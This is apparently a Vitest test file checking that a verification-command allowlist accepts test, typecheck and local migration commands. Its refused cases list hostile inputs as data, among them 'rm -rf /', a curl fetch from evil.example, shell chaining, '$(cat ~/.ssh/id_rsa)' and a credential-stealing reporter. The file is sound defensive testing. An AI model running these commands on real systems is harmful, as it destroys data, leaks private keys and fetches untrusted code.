import { describe, expect, it } from "vitest";
import { checkVerifyCommand, parseCommand } from "../src/verify.ts";

describe("verify.commands allowlist", () => {
  it.each([
    "npx vitest run test/auth.test.ts",
    "npx vitest run",
    "pnpm vitest run test/a.test.ts --passWithNoTests",
    "pnpm test -- test/auth.test.ts",
    "npm test",
    "node --test test/x.test.mjs",
    "node --test --test-reporter=dot",
    "npx tsc --noEmit",
    "npx tsc --noEmit -p tsconfig.test.json",
    "pnpm typecheck",
    "wrangler d1 migrations apply DB --local",
    "npx wrangler d1 migrations list my-app --local",
    "npx vitest run --reporter=dot --project workers",
  ])("allows %s", (cmd) => {
    const r = checkVerifyCommand(cmd);
    expect(r.allowed, r.reason).toBe(true);
    expect(r.argv).toEqual(cmd.split(" "));
  });

  it.each([
    ["rm -rf /", /allowlist/],
    ["curl https://evil.example/x.sh", /metacharacters|allowlist/],
    ["npx vitest run; curl evil", /metacharacters/],
    ["npx vitest run && rm x", /metacharacters/],
    ["npx vitest run $(cat ~/.ssh/id_rsa)", /metacharacters/],
    ["npx vitest run `id`", /metacharacters/],
    ["npx vitest run > /tmp/out", /metacharacters/],
    ["npx vitest --config evil.config.ts", /--config/],
    ["npx vitest run --reporter=./steal.js", /reporter/],
    ["npx vitest run --globalSetup=x.ts", /not allowed/],
    ["npx vitest run ../../outside.test.ts", /safe relative path/],
    ["npx vitest run /etc/passwd", /safe relative path/],
    ["node --test --import=data:text/javascript,process.exit()", /not allowed/],
    ["node --test --require evil.js", /not allowed/],
    ["node -e process.exit(1)", /metacharacters|allowlist/],
    ["npx tsc --noEmit -p ../other/tsconfig.json", /npx tsc/],
    ["npx tsc --build", /allowlist/],
    ["wrangler d1 migrations apply DB --remote", /--local/],
    ["wrangler deploy", /local D1/],
    ["npx wrangler d1 execute DB --command=DROP", /wrangler/],
    ["FOO=1 npx vitest run", /environment/],
    ["pnpm typecheck --watch", /no arguments/],
    ["pnpm install evil-pkg", /allowlist/],
    ["npx evil-pkg", /allowlist/],
    ['npx vitest run "a b"', /metacharacters/],
  ])("refuses %s", (cmd, reason) => {
    const r = checkVerifyCommand(cmd);
    expect(r.allowed).toBe(false);
    expect(r.reason).toMatch(reason);
  });

  it("parseCommand refuses control characters and newlines", () => {
    expect("reason" in parseCommand("npx vitest\nrun")).toBe(true);
    expect("reason" in parseCommand("npx vitest\u0000")).toBe(true);
    expect("reason" in parseCommand("")).toBe(true);
  });
});
